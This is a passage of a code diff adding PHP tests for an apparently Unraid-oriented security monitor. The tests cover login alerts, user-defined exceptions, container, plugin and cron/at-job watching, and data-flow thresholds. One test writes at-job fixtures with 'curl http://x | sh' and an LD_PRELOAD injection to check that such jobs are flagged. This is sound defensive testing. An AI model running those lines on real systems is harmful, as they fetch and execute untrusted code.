+    $b = readJson("$data/baseline.json");
+    unset($b['ips']['10.1.1.1']);
+    file_put_contents("$data/baseline.json", json_encode($b));
+    file_put_contents($paths['syslog'], $line($t0 + 86 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 86 * 86400 + 300);
+    $open = array_values(array_filter($of('login_new_ip'), 'watchmanOpen'));
+    same('known: without rules.json (an older office) — asked again, as before 1.96', 1, count($open));
+    rename("$tmp/rules.json", "$data/rules.json");
+    watchmanAck($open[0]['id'], $data, $t0 + 86 * 86400 + 400, false);
+
+    // «Take back»: out of the baseline — the next login from it is told again
+    $k = array_values(array_filter(watchmanKnown(watchmanRulesRaw($data)), fn ($x) => $x['kind'] === 'login_new_ip'))[0];
+    watchmanKnownRemove($k['id'], $data, false);
+    same('take back: the answer gone, the address out of what is normal', [false, false],
+        [(bool) array_filter(watchmanKnown(watchmanRulesRaw($data)), fn ($x) => $x['id'] === $k['id']), isset(watchmanLoad($data)['baseline']['ips']['10.1.1.1'])]);
+    file_put_contents($paths['syslog'], $line($t0 + 87 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 87 * 86400 + 300);
+    same('take back: the next login from it — open again', 1, count(array_filter($of('login_new_ip'), 'watchmanOpen')));
+    $err = (function () use ($k, $data) { try { watchmanKnownRemove($k['id'], $data, false); return null; } catch (Problem $p) { return $p->key; } })();
+    same('take back: one not there', 'watch_known_gone', $err);
+
+    // an event keeps no answer; a data flow only within its peak then
+    $ev = watchmanEntry('log_cleared', 'log_cleared:/var/log/syslog', $t0, ['file' => '/var/log/syslog']);
+    $ev['noted'] = $t0 + 5;
+    $ev['by'] = 'page';
+    $n = count(watchmanKnown(watchmanRulesRaw($data)));
+    watchmanKnownNote($data, [$ev], [], $t0 + 5);
+    same('known: an event («this time») keeps no answer', $n, count(watchmanKnown(watchmanRulesRaw($data))));
+    $flow = fn (int $peak) => ['id' => 'w0000000099', 'kind' => 'flow_client', 'key' => 'flow_client:192.168.1.5|smb', 'time' => 1, 'last' => 1, 'count' => 1,
+        'p' => ['ip' => '192.168.1.5', 'peak' => $peak], 'noted' => null, 'by' => null];
+    $kf = [['id' => 'k0000000001', 'kind' => 'flow_client', 'key' => 'flow_client:192.168.1.5|smb', 'sig' => '', 'at' => 5, 'bytes' => 10 << 30]];
+    $bb = ['flow' => ['ack' => []]];
+    $bk = [$flow(30 << 30)];
+    $within = watchmanKnownMeet($bk, 0, $bb, [], $kf, 100);
+    $bk2 = [$flow(80 << 30)];
+    $over = watchmanKnownMeet($bk2, 0, $bb, [], $kf, 100);
+    same('known: a data flow within 4× its peak then — noted; far beyond — asked', [true, false], [$within, $over]);
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    hardeningRm($tmp);
+}
+
+/**
+ * His settings and his setup page's actions (1.96 step 5, agent/desks/watchman-rules.php): every setting has its words
+ * in five languages; the defaults are what he did up to 1.95; a value out of its bounds or of another type is the
+ * default; «Apply» keeps only what differs, refuses what is out of bounds or unknown, «Back to the defaults» clears;
+ * a real round with 8 failed logins for a burst (6 are none, 8 are one); an exception by hand (a private net of any size
+ * from /8, a public one at most a /24 and only with the clear yes, a user from a net; nonsense refused).
+ */
+function testWatchmanSettings(): void
+{
+    same('settings: the defaults are what he did up to 1.95', [WATCH_FAIL_BURST, WATCH_FAIL_WINDOW],
+        [WATCH_SETTINGS['login']['burst']['def'], WATCH_SETTINGS['login']['window']['def']]);
+    $missing = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$code.json");
+        foreach (WATCH_SETTINGS as $cat => $keys) {
+            foreach (array_keys($keys) as $k) {
+                if (!is_string($lang["setting.$cat.$k"] ?? null)) {
+                    $missing[] = "$code setting.$cat.$k";
+                }
+            }
+        }
+    }
+    same('settings: each its words in five languages', [], $missing);
+    same('settings: out of bounds, another type — the default; in bounds — the value', [5, 600, 12, 1800],
+        [watchmanSettings(['set' => ['login' => ['burst' => 999, 'window' => '900']]])['login']['burst'], watchmanSettings(['set' => ['login' => ['window' => 'x']]])['login']['window'],
+         watchmanSettings(['set' => ['login' => ['burst' => 12]]])['login']['burst'], watchmanSettings(['set' => ['login' => ['window' => 1800]]])['login']['window']]);
+
+    $tmp = hardeningTmp('watch-settings');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    foreach (['go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n", 'sec' => '', 'sec_nfs' => '',
+              'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $docker = fn () => [];
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($t0);
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('cat_set: out of bounds, an unknown key, not a number, an area without settings — refused, nothing saved',
+        ['watch_setting_range', 'bad_request', 'bad_request', 'bad_request', null],
+        [$err(fn () => watchmanCatSettings('login', ['burst' => 2], false, $data, false)), $err(fn () => watchmanCatSettings('login', ['often' => 4], false, $data, false)),
+         $err(fn () => watchmanCatSettings('login', ['burst' => '8'], false, $data, false)), $err(fn () => watchmanCatSettings('plugin', ['x' => 1], false, $data, false)),
+         watchmanRulesRaw($data)['set'] ?? null]);
+    watchmanCatSettings('login', ['burst' => 8, 'window' => 600], false, $data, false);
+    same('cat_set: only what differs from the default is kept', ['login' => ['burst' => 8]], watchmanRulesRaw($data)['set'] ?? null);
+    $fails = fn (int $t, int $n, string $ip) => file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($t + $i, "sshd[7]: Failed password for root from $ip port " . (4000 + $i) . ' ssh2'), range(0, $n - 1))), FILE_APPEND);
+    $fails($t0 + 100, 6, '203.0.113.5');
+    $round($t0 + 300);
+    $bursts = fn () => count(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_failures'));
+    same('round: 6 failed logins with 8 set — no burst', 0, $bursts());
+    $fails($t0 + 400, 8, '203.0.113.6');
+    $round($t0 + 600);
+    same('round: 8 — a burst', 1, $bursts());
+    same('page: the setting with its value, default and bounds; the help\'s limits follow it', [['value' => 8, 'def' => 5, 'min' => 3, 'max' => 50, 'unit' => 'n'], 8],
+        [watchmanPageState($data, $t0 + 600, false)['settings']['login']['burst'], watchmanPageState($data, $t0 + 600, false)['limits']['burst']]);
+    watchmanCatSettings('login', null, true, $data, false);
+    same('cat_set: back to the defaults — the area\'s entry goes', null, watchmanRulesRaw($data)['set'] ?? null);
+
+    // an exception by hand
+    same('rule_hand: a private net of any size, an address, a user from a net', [true, true, true],
+        [isset(watchmanRuleHand('login', 'net', '10.0.0.0/8', '', false, $data, $t0, false)['rule']), isset(watchmanRuleHand('login', 'ip', '192.168.5.5', '', false, $data, $t0, false)['rule']),
+         isset(watchmanRuleHand('login', 'user_net', '192.168.7.0/24', 'root', false, $data, $t0, false)['rule'])]);
+    same('rule_hand: a public net wider than /24, a public one without the clear yes, nonsense, a user missing, another area — refused',
+        ['watch_net_wide', 'watch_rule_ask', 'watch_rule_ask', 'watch_net_bad', 'watch_net_bad', 'watch_net_bad', 'bad_request'],
+        [$err(fn () => watchmanRuleHand('login', 'net', '203.0.0.0/16', '', true, $data, $t0, false)), $err(fn () => watchmanRuleHand('login', 'net', '203.0.113.0/24', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('login', 'ip', '203.0.113.9', '', false, $data, $t0, false)), $err(fn () => watchmanRuleHand('login', 'net', '192.168.1.7/24', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('login', 'net', 'my lan', '', false, $data, $t0, false)), $err(fn () => watchmanRuleHand('login', 'user_net', '192.168.7.0/24', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('plugin', 'net', '10.0.0.0/8', '', false, $data, $t0, false))]);
+    same('rule_hand: a public /24 with the clear yes — made; what each covers', [true, [WATCH_RULE_LOGIN, WATCH_RULE_LOGIN, ['login_new_ip'], WATCH_RULE_LOGIN]],
+        [isset(watchmanRuleHand('login', 'net', '203.0.113.0/24', '', true, $data, $t0, false)['rule']), array_column(watchmanRules(watchmanRulesRaw($data))['rules'], 'kinds')]);
+    hardeningRm($tmp);
+}
+
+/**
+ * 1.96 step 6a — containers, plugins, what starts by itself: the settings (a choice per kind «in his book / told / not at
+ * all», switches for lines noted by himself, the at job's days) and the exceptions (a container's ports or rights, new
+ * plugins from a source, a User Script, a plugin's .cron file, lines from a cron.d file, an at job's exact command) — for
+ * each a case it covers and one it doesn't.
+ */
+function testWatchmanRules6a(): void
+{
+    $now = strtotime('2026-11-20 10:00:00');
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, $now, $p);
+    $rule = fn (array $kinds, array $on) => ['kinds' => $kinds, 'on' => $on];
+    $covers = fn (array $r, array $x) => watchmanRuleCovers($r, $x);
+
+    // the settings: defaults are what he did up to 1.95, the types held
+    same('6a settings: the defaults (quiet, off, 2 days = WATCH_AT_LATE)', ['quiet', false, false, 'quiet', WATCH_AT_LATE / 86400],
+        [WATCH_SETTINGS['container']['ports']['def'], WATCH_SETTINGS['container']['plain']['def'], WATCH_SETTINGS['plugin']['versions']['def'],
+         WATCH_SETTINGS['sched']['scripts']['def'], WATCH_SETTINGS['sched']['at_late']['def']]);
+    $s = watchmanSettings(['set' => ['container' => ['ports' => 'loud', 'plain' => 1], 'plugin' => ['versions' => true], 'sched' => ['scripts' => 'tell', 'at_late' => 30]]]);
+    same('6a settings: a choice not its own, a number for a switch, out of bounds — the default; the right type — the value',
+        ['quiet', false, true, 'tell', 2], [$s['container']['ports'], $s['container']['plain'], $s['plugin']['versions'], $s['sched']['scripts'], $s['sched']['at_late']]);
+    same('6a settings: the kinds a choice sets', [[], ['container_ports' => 'none', 'script_new' => 'tell', 'script_changed' => 'tell']],
+        [watchmanKindModes(watchmanSettings([])), watchmanKindModes(watchmanSettings(['set' => ['container' => ['ports' => 'none'], 'sched' => ['scripts' => 'tell']]]))]);
+
+    // the shapes: covers, doesn't
+    $ports = $e('container_ports', 'container_ports:plex', ['name' => 'plex', 'tokens' => ['-p 8080:8080/tcp']]);
+    same('6a key named: the ports of plex — plex\'s new ports yes; sonarr\'s, plex\'s rights no',
+        [true, false, false],
+        [$covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $ports),
+         $covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $e('container_ports', 'container_ports:sonarr', ['name' => 'sonarr'])),
+         $covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $e('container_rights', 'container_ports:plex', ['name' => 'plex']))]);
+    $src = $rule(['plugin_new'], ['source' => 'github.com/alice']);
+    same('6a source: a new plugin from github.com/alice yes; from bob, from github.com alone, alice\'s plugin moving its source no',
+        [true, false, false, false],
+        [$covers($src, $e('plugin_new', 'plugin_new:a', ['name' => 'a', 'source' => 'github.com/alice'])),
+         $covers($src, $e('plugin_new', 'plugin_new:b', ['name' => 'b', 'source' => 'github.com/bob'])),
+         $covers($src, $e('plugin_new', 'plugin_new:c', ['name' => 'c', 'source' => 'github.com'])),
+         $covers($src, $e('plugin_source', 'plugin_source:a', ['name' => 'a', 'source' => 'github.com/alice']))]);
+    $file = $rule(['cron_new'], ['file' => 'mine']);
+    same('6a file: new lines all from cron.d/mine yes; some from root\'s crontab too, another file, none said no',
+        [true, false, false, false],
+        [$covers($file, $e('cron_new', 'cron_new', ['lines' => 1, '_from' => ['cron.d/mine']])), $covers($file, $e('cron_new', 'cron_new', ['lines' => 2, '_from' => ['cron.d/mine', 'crontab']])),
+         $covers($file, $e('cron_new', 'cron_new', ['lines' => 1, '_from' => ['cron.d/yours']])), $covers($file, $e('cron_new', 'cron_new', ['lines' => 1]))]);
+    $at = fn (array $p) => $e('at_job', 'at_job:a0000101c2b3a4', $p + ['job' => 'a0000101c2b3a4', 'cmd' => '/usr/local/bin/tidy', 'user' => 'root', 'owner' => 'root']);
+    $cmd = $rule(['at_job'], ['cmd' => 'abcdef0123456789', 'user' => 'root', 'owner' => 'root']);
+    same('6a cmd: exactly this clean command as root, its program root\'s yes; another fingerprint, another owner, another user, no clean command, a plugin\'s job not as he knew it no',
+        [true, false, false, false, false, false],
+        [$covers($cmd, $at(['_one' => 'abcdef0123456789'])), $covers($cmd, $at(['_one' => 'abcdef012345678a'])), $covers($cmd, $at(['_one' => 'abcdef0123456789', 'owner' => 'nobody'])),
+         $covers($cmd, $at(['_one' => 'abcdef0123456789', 'user' => 'nobody'])), $covers($cmd, $at([])), $covers($cmd, $at(['_one' => 'abcdef0123456789', '_changed' => true]))]);
+    same('6a shapes: only exactly their shape', [null, null, null, ['file' => 'x.cron']],
+        [watchmanRuleOn(['source' => 'https://github.com/a']), watchmanRuleOn(['cmd' => 'abcdef0123456789', 'user' => 'root']), watchmanRuleOn(['file' => '../root']),
+         watchmanRuleOn(['file' => 'x.cron'])]);
+
+    // what a click offers
+    $types = fn (array $x) => array_column(watchmanRuleOffers($x, [$x]), 'type');
+    same('6a offers: a source with its owner, the cron.d file, the at command (with its words); never for a whole host, two files, a job without a clean command',
+        [['source', 'key'], ['key'], ['file', 'key'], ['key'], ['cmd', 'key'], ['key'], '/usr/local/bin/tidy'],
+        [$types($e('plugin_new', 'plugin_new:a', ['name' => 'a', 'source' => 'github.com/alice'])), $types($e('plugin_new', 'plugin_new:c', ['name' => 'c', 'source' => 'example.com'])),
+         $types($e('cron_new', 'cron_new', ['_from' => ['cron.d/mine']])), $types($e('cron_new', 'cron_new', ['_from' => ['cron.d/mine', 'crontab']])),
+         $types($at(['_one' => 'abcdef0123456789'])), $types($at([])), watchmanRuleOffers($at(['_one' => 'abcdef0123456789']), [])[0]['what'] ?? null]);
+
+    // the detection his settings switch on
+    $known = ['db' => ['tokens' => [], 'seen' => $now]];
+    $book = [];
+    watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]], $book, $now);
+    $book2 = [];
+    $known2 = ['db' => ['tokens' => [], 'seen' => $now]];
+    watchmanContainersCompare($known2, ['db' => ['image' => 'postgres', 'tokens' => []], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]], $book2, $now, [], true);
+    same('6a container without rights: by default nothing; with the switch a line noted by himself, never open — normal either way',
+        [[], [['container_plain', 'auto', false]], true],
+        [$book, array_map(fn ($x) => [$x['kind'], $x['by'], watchmanOpen($x)], $book2), isset($known['web'], $known2['web'])]);
+    $pk = ['a' => ['source' => 'github.com/alice', 'version' => '1', 'seen' => $now]];
+    $pb = [];
+    watchmanPluginsCompare($pk, ['a' => ['source' => 'github.com/alice', 'version' => '2']], $pb, $now);
+    $pk2 = ['a' => ['source' => 'github.com/alice', 'version' => '1', 'seen' => $now]];
+    $pb2 = [];
+    watchmanPluginsCompare($pk2, ['a' => ['source' => 'github.com/alice', 'version' => '2']], $pb2, $now, [], true);
+    same('6a plugin version: by default nothing; with the switch a line noted by himself (the old and the new version)',
+        [[], [['plugin_version', 'auto', '2', '1']]], [$pb, array_map(fn ($x) => [$x['kind'], $x['by'], $x['p']['version'], $x['p']['old']], $pb2)]);
+    $job = ['when' => $now - 86400 - 60, 'cmd' => '/usr/local/bin/tidy', 'uid' => 0, 'user' => 'root'];
+    $ab = [];
+    watchmanAtSet($ab, 'a0000101c2b3a4', $job, $now);
+    $ab2 = [];
+    watchmanAtSet($ab2, 'a0000101c2b3a4', $job + ['one' => 'abcdef0123456789'], $now, false, 86400);
+    same('6a at: a day past its time — by default not stuck; with one day set stuck (important); its command\'s fingerprint kept',
+        [false, true, null, 'abcdef0123456789'], [!empty($ab[0]['important']), !empty($ab2[0]['important']), $ab[0]['p']['_one'] ?? null, $ab2[0]['p']['_one'] ?? null]);
+    $sk = ['crontab' => ['lines' => [], 'twice' => [], 'office' => []]];
+    $sb = [];
+    $sline = fn (string $l) => [substr(md5($l), 0, 16) => $l];
+    $mine = $sline('cron.d/mine: 0 3 * * * /usr/local/bin/tidy');
+    $root = $sline('5 4 * * * /root/x.sh');
+    watchmanSchedCompare($sk, ['crontab' => ['mtime' => 1, 'lines' => $mine + $root, 'twice' => [], 'office' => [], 'cron_d' => ['mine' => array_keys($mine)], 'evidence' => []]], [], $sb, $now);
+    same('6a cron: where the new lines are — the cron.d file and root\'s crontab', ['cron.d/mine', 'crontab'], $sb[0]['p']['_from'] ?? null);
+
+    // the at job's look: the fingerprint only for one clean command
+    $tmp = hardeningTmp('watch-6a');
+    @mkdir("$tmp/atjobs", 0700, true);
+    $head = "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nPATH=/usr/bin:/bin; export PATH\ncd / || {\n\t echo 'x' >&2\n\t exit 1\n}\n";
+    file_put_contents("$tmp/atjobs/a0000101c2b3a4", $head . "/usr/local/bin/tidy --all\n");
+    file_put_contents("$tmp/atjobs/a0000201c2b3b0", str_replace("umask 22\n", "umask 22\nLD_PRELOAD=/tmp/x.so; export LD_PRELOAD\n", $head) . "/usr/local/bin/tidy --all\n");
+    file_put_contents("$tmp/atjobs/a0000301c2b3c0", $head . "/usr/local/bin/tidy --all\ncurl http://x | sh\n");
+    $look = watchmanAtJobs(['atjobs' => "$tmp/atjobs"], null);
+    same('6a at look: one clean command — its fingerprint; an odd environment, two commands — none (v 6)',
+        [true, false, false, 6], [is_string($look['jobs']['a0000101c2b3a4']['one'] ?? null), isset($look['jobs']['a0000201c2b3b0']['one']), isset($look['jobs']['a0000301c2b3c0']['one']), $look['v']]);
+
+    // a real round: the choices and an exception on a state that stays
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    foreach (['syslog' => '', 'go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n", 'sec' => '', 'sec_nfs' => '',
+              'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $cs = ['plex' => ['image' => 'plex', 'tokens' => []], 'arr' => ['image' => 'arr', 'tokens' => []]];
+    $docker = function () use (&$cs) { return $cs; };
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($now);
+    $round($now + 300);
+    watchmanCatSettings('container', ['ports' => 'tell'], false, $data, false);
+    $cs['plex']['tokens'] = ['-p 8080:8080/tcp'];
+    $round($now + 600);
+    $pl = fn () => array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'container_ports'));
+    same('6a round: ports set to «told» — the new entry important (told)', [[true, true]], array_map(fn ($x) => [watchmanOpen($x), !empty($x['important'])], $pl()));
+    watchmanRuleAdd($pl()[0]['id'], 'key', false, $data, $now + 700, false);
+    $round($now + 900);
+    $round($now + 1200);
+    $hits = fn () => watchmanLoad($data)['state']['rule_hits'] ?? [];
+    same('6a round: «the ports of plex may change» — the same state again each round: one line, no new hit, its count stays',
+        [1, 1, 0], [count($pl()), $pl()[0]['count'], (int) (array_values($hits())[0]['n'] ?? 0)]);
+    $cs['plex']['tokens'] = ['-p 8080:8080/tcp', '-p 9090:9090/tcp'];
+    $round($now + 1500);
+    same('6a round: another port of plex — still its line, now a hit and counted', [1, 2, 1], [count($pl()), $pl()[0]['count'], (int) (array_values($hits())[0]['n'] ?? 0)]);
+    watchmanCatSettings('container', ['ports' => 'none'], false, $data, false);
+    $cs['arr']['tokens'] = ['-p 7878:7878/tcp'];
+    $round($now + 1800);
+    $round($now + 2100);
+    same('6a round: ports set to «not at all» — nothing about arr\'s new port in his book, normal from then on',
+        [[], ['-p 7878:7878/tcp']], [array_values(array_filter($pl(), fn ($x) => ($x['p']['name'] ?? '') === 'arr')), watchmanLoad($data)['baseline']['containers']['arr']['tokens'] ?? null]);
+    same('6a cat_set: a switch must be true or false, a choice one of its own',
+        ['bad_request', 'bad_request', null], [$err(fn () => watchmanCatSettings('container', ['plain' => 1], false, $data, false)),
+         $err(fn () => watchmanCatSettings('container', ['ports' => 'loud'], false, $data, false)), $err(fn () => watchmanCatSettings('container', ['plain' => true, 'ports' => 'quiet'], false, $data, false))]);
+    same('6a cat_set: only what differs kept (quiet is the default)', ['plain' => true], watchmanRulesRaw($data)['set']['container'] ?? null);
+
+    // exceptions by hand
+    $made = fn (string $cat, string $type, string $v, bool $sure = false) => watchmanRuleHandMake($cat, $type, $v, '');
+    same('6a hand: ports and rights of a container, a User Script, a plugin\'s .cron file (as keys), a cron.d file, a source',
+        [[['container_ports'], ['key' => 'container_ports:plex']], [['container_rights'], ['key' => 'container_rights:plex']], [['script_changed'], ['key' => 'script_changed:Nightly copy']],
+         [['cron_file'], ['key' => 'cron_file:dynamix/x.cron']], [['cron_new'], ['file' => 'mine']], [['plugin_new'], ['source' => 'github.com/alice']], false, true],
+        [[$made('container', 'ports', 'plex')['kinds'], $made('container', 'ports', 'plex')['on']], [$made('container', 'rights', 'plex')['kinds'], $made('container', 'rights', 'plex')['on']],
+         [$made('sched', 'script', 'Nightly copy')['kinds'], $made('sched', 'script', 'Nightly copy')['on']],
+         [$made('sched', 'cron_file', 'dynamix/x.cron')['kinds'], $made('sched', 'cron_file', 'dynamix/x.cron')['on']],
+         [$made('sched', 'crond', '/etc/cron.d/mine')['kinds'], $made('sched', 'crond', '/etc/cron.d/mine')['on']],
+         [$made('plugin', 'source', 'https://github.com/alice')['kinds'], $made('plugin', 'source', 'https://github.com/alice')['on']],
+         $made('plugin', 'source', 'github.com/alice')['wide'], $made('plugin', 'source', 'github.com')['wide']]);
+    same('6a hand: a whole source without the clear yes, cron.d/root (Unraid\'s own), a name with a slash, a type of another area — refused',
+        ['watch_rule_ask', 'watch_value_bad', 'watch_value_bad', 'bad_request'],
+        [$err(fn () => watchmanRuleHand('plugin', 'source', 'github.com', '', false, $data, $now, false)), $err(fn () => watchmanRuleHandMake('sched', 'crond', 'root', '')),
+         $err(fn () => watchmanRuleHandMake('container', 'ports', '../x', '')), $err(fn () => watchmanRuleHandMake('container', 'script', 'x', ''))]);
+    same('6a hand: the page knows each area\'s types', WATCH_HAND, watchmanPageState($data, $now + 2100, false)['hand']);
+    hardeningRm($tmp);
+}
+
+/**
+ * 1.96 step 6b — the data flow: settings (defaults = the constants he judged by), exceptions on a share or disk (let through
+ * in the rules' pass), thresholds where the flow is judged (an amount, a snapshot's hold, new Docker layers) with their hits,
+ * and «always tell» (half a share, 200 000 files in an hour) that no exception silences. The existing flow tests run unchanged.
+ */
+function testWatchmanRules6b(): void
+{
+    $gb = 1024 ** 3;
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6b settings: the defaults are the constants he judged by', [WATCH_FLOW_FACTOR, WATCH_FLOW_MIN, WATCH_FLOW_NEW, WATCH_FLOW_FACTOR, WATCH_FLOW_MIN, WATCH_FLOW_MIN, WATCH_FILES_MIN, true, true],
+        [WATCH_SETTINGS['pull']['factor']['def'], WATCH_SETTINGS['pull']['min']['def'] * $gb, WATCH_SETTINGS['pull']['new']['def'] * $gb, WATCH_SETTINGS['data']['factor']['def'],
+         WATCH_SETTINGS['data']['gone_min']['def'] * $gb, WATCH_SETTINGS['data']['written_min']['def'] * $gb, WATCH_SETTINGS['data']['files_min']['def'],
+         WATCH_SETTINGS['data']['kept']['def'], WATCH_SETTINGS['data']['must']['def']]);
+    same('6b things: a share by its gone, files, written key (without its pool); a disk; a client none',
+        [['share', 'Serien'], ['share', 'Serien'], ['share', 'Serien'], ['disk', 'disk1'], ['disk', 'disk1'], ['disk', 'disk1'], null],
+        array_map('watchmanFlowThing', ['flow_gone:share:Serien', 'flow_gone:files:share:Serien', 'flow_written:tank/Serien', 'flow_gone:disk:disk1',
+            'flow_gone:files:disk:disk1', 'flow_written:disk:disk1', 'flow_client:192.0.2.7|smb']));
+    $e = fn (string $kind, string $key, array $p = []) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    same('6b share: its deletions (bytes and files) yes; Filme\'s, a disk named so, its writing (kinds) no',
+        [true, true, false, false, false],
+        [$cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:share:Serien')), $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:files:share:Serien')),
+         $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:share:Filme')), $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:disk:Serien')),
+         $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_written', 'flow_written:tank/Serien'))]);
+    same('6b disk: its writing yes; another disk, a share named so no', [true, false, false],
+        [$cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:disk:disk1')), $cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:disk:disk2')),
+         $cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:tank/disk1'))]);
+    $shape = fn (array $kinds, array $opt) => watchmanRuleShaped(['id' => 'r0000000001', 'cat' => 'data', 'kinds' => $kinds, 'on' => ['share' => 'Serien'], 'at' => 1, 'opt' => $opt]);
+    same('6b thresholds: only in exactly their shape and on their kinds', [true, true, true, true, false, false, false, false],
+        [$shape(['flow_gone'], ['min' => 5 * $gb]) !== null, $shape(['flow_gone'], ['files' => 9000]) !== null, $shape(['flow_gone'], ['kept' => false]) !== null,
+         $shape(['flow_written'], ['layers' => false]) !== null, $shape(['flow_written'], ['kept' => false]) !== null, $shape(['flow_gone'], ['min' => -1]) !== null,
+         $shape(['flow_gone'], ['min' => 1, 'files' => 1]) !== null,
+         watchmanRuleShaped(['id' => 'r0000000001', 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['net' => '10.0.0.0/8'], 'at' => 1, 'opt' => ['min' => 1]]) !== null]);
+    $types = fn (array $x) => array_column(watchmanRuleOffers($x, [$x]), 'type');
+    $o = watchmanRuleOffers($e('flow_gone', 'flow_gone:share:Serien', ['share' => 'Serien', 'peak' => 30 * $gb + 7, 'kept' => 5 * $gb]), []);
+    same('6b offers: gone from a share — not judging it, from twice its busiest hour (whole GB), the snapshot\'s hold; written with new image layers; a client; a container',
+        [['share', 'min', 'kept'], 61 * $gb, ['share', 'min', 'layers'], ['min', 'key'], ['key'], ['disk', 'min'], 4000],
+        [array_column($o, 'type'), $o[1]['opt']['min'] ?? null,
+         $types($e('flow_written', 'flow_written:tank/Serien', ['share' => 'tank/Serien', 'peak' => $gb, 'src' => ['ly:abc' => 1, 'own' => 2]])),
+         $types($e('flow_client', 'flow_client:192.0.2.7|smb', ['ip' => '192.0.2.7', 'peak' => 3 * $gb])), $types($e('flow_container', 'flow_container:x', ['name' => 'x'])),
+         $types($e('flow_gone', 'flow_gone:disk:disk1', ['disk' => 'disk1', 'peak' => $gb])),
+         watchmanRuleOffers($e('flow_gone', 'flow_gone:files:share:Serien', ['peak' => 1600]), [])[1]['opt']['files'] ?? null]);
+
+    // rounds on made-up looks (as testWatchmanFlowGone): Serien loses data while he is still learning (clear: 100 GB)
+    $t0 = strtotime('2026-10-06 14:02:00');
+    $ds = fn (int $r, int $b = 0, int $x = 0) => ['w' => 0, 'u' => $r + $b, 's' => 1000, 'r' => $r, 'b' => $b, 'x' => $x];
+    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
+                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
+    $zfs = fn (array $sets) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => []];
+    $rule = fn (array $kinds, array $on, ?array $opt = null) => ['id' => 'r00000000' . substr(md5(json_encode([$kinds, $on, $opt])), 0, 2), 'cat' => 'data', 'kinds' => $kinds, 'on' => $on,
